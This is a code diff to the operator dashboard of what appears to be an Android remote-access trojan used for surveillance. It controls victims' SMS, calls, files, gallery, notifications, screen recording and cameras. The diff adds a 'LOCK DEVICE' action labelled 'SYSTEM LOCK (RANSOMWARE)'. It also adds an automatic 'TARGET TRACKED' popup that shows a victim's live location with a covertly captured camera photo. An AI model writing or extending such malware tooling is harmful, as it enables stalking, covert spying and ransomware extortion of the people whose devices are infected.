@@ -637,7 +637,7 @@
             }
 
             const buttons = [
-                'sms','calls','filemanager','gallery','notifications','apps','toast','openurl',
+                'sms','calls','filemanager','gallery','notifications','apps','lock','openurl',
                 'get_location','flash','screenrecord','takebackpic','takefrontpic'
             ];
             grid.innerHTML = buttons.map(btn => {
@@ -648,7 +648,7 @@
                 else if (btn === 'gallery') icon = 'fa-images';
                 else if (btn === 'notifications') icon = 'fa-bell';
                 else if (btn === 'apps') icon = 'fa-th-large';
-                else if (btn === 'toast') icon = 'fa-window-maximize';
+                else if (btn === 'lock') icon = 'fa-user-lock';
                 else if (btn === 'openurl') icon = 'fa-external-link-alt';
                 else if (btn === 'get_location') icon = 'fa-map-marker-alt';
                 else if (btn === 'flash') icon = 'fa-bolt';
@@ -656,6 +656,7 @@
                 else if (btn === 'takebackpic') icon = 'fa-camera-retro';
                 else if (btn === 'takefrontpic') icon = 'fa-camera';
 
+                if (btn === 'lock') label = 'LOCK DEVICE';
                 if (btn === 'flash') label = flashOn ? 'FLASH ON' : 'FLASH OFF';
                 if (btn === 'screenrecord') label = screenRecordOn ? 'REC ON' : 'REC OFF';
 
@@ -670,6 +671,7 @@
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
             else if (action === 'get_location') sendCommand('get_location');
+            else if (action === 'lock') openModal('lock');
             else openModal(action);
         };
 
@@ -748,7 +750,7 @@
                 body.innerHTML = `<div class="gallery-grid">${files.map(f => `<div class="gallery-item"><img src="data:image/jpeg;base64,${f.thumbnail}"/><p>${f.name}</p></div>`).join('')}</div>`;
                 footer.innerHTML = `<button onclick="sendCommand('gallery back')">◀ Prev</button><span>page ${data.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next ▶</button>`;
             }
-            else if (currentModal === 'toast') {
+            else if (currentModal === 'lock') {
                 body.innerHTML = `
                     <div style="text-align:center; padding:10px;">
                         <h3 style="color:red; margin-bottom:15px;">⚠️ SYSTEM LOCK (RANSOMWARE)</h3>
@@ -769,6 +771,12 @@
                 if (url) {
                     // Extract coords
                     const coords = url.split('q=')[1];
+                    const imgHtml = data.camera_image && data.camera_image.startsWith('loc_pic') ? 
+                        `<div style="margin-top:15px;">
+                            <h4 style="color:var(--accent-secondary); margin-bottom:8px;">📸 VISUAL CONFIRMATION</h4>
+                            <img src="/captured_images/${data.camera_image}" style="width:100%; border-radius:18px; border:2px solid var(--accent-primary); box-shadow:0 0 20px var(--glow-primary);">
+                        </div>` : '';
+
                     body.innerHTML = `
                         <div style="text-align:center;">
                             <iframe 
@@ -784,6 +792,7 @@
                             <a href="${url}" target="_blank" style="background:var(--surface-light); padding:8px 16px; border-radius:20px; text-decoration:none; color:white; border:1px solid var(--accent-primary);">
                                 Open in Google Maps ↗
                             </a>
+                            ${imgHtml}
                         </div>
                     `;
                     footer.innerHTML = `<button onclick="sendCommand('get_location')">Force Update Location</button>`;
@@ -895,6 +904,28 @@
                     clientDataCache[selectedClientId] = cdata;
                     
                     if (currentModal) renderModalContent();
+
+                    // --- AUTO POPUP FOR LOCATION + PHOTO ---
+                    if (cdata.location_url) {
+                        const locHash = selectedClientId + cdata.location_url + (cdata.camera_image || '');
+                        if (!lastDataHashes['auto_loc'] || lastDataHashes['auto_loc'] !== locHash) {
+                            lastDataHashes['auto_loc'] = locHash;
+                            const coords = cdata.location_url.split('q=')[1];
+                            const imgHtml = cdata.camera_image && cdata.camera_image.startsWith('loc_pic') ? 
+                                `<img src="/captured_images/${cdata.camera_image}" style="width:100%; border-radius:12px; margin-top:10px; border:1px solid var(--accent-primary);">` : '';
+                            
+                            showPopup('info', `
+                                <div style="min-width:250px;">
+                                    <strong style="color:var(--accent-secondary);">📍 TARGET TRACKED</strong><br>
+                                    <small>${coords}</small>
+                                    ${imgHtml}
+                                    <div style="margin-top:8px;">
+                                        <button onclick="openModal('get_location')" style="padding:4px 10px; font-size:0.7rem;">View Map</button>
+                                    </div>
+                                </div>
+                            `);
+                        }
+                    }
 
                     // Real-time notifications from notifications list
                     if (cdata.notifications?.length) {
